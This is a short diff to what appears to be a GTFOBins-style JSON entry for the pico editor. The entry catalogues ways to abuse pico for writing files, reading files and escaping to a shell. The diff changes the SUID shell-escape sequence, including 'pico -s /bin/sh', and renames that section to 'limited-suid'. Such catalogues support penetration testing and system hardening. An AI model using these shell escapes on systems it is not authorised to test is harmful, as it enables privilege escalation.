@@ -11,7 +11,7 @@
     ],
     "file-write": [
       {
-        "code": "pico [file]\nDATA\n^O\n"
+        "code": "pico [file]\n[data]\n^O\n"
       }
     ],
     "file-read": [
@@ -19,10 +19,10 @@
         "code": "pico [file]"
       }
     ],
-    "suid": [
+    "limited-suid": [
       {
         "description": "The 'SPELL' environment variable can be used in place of the '-s' option if the command line cannot be changed.",
-        "code": "./pico\n^R^X\nreset; sh 1>&0 2>&0\n"
+        "code": "./pico -s /bin/sh\n/bin/sh\n^T\n"
       }
     ],
     "sudo": [
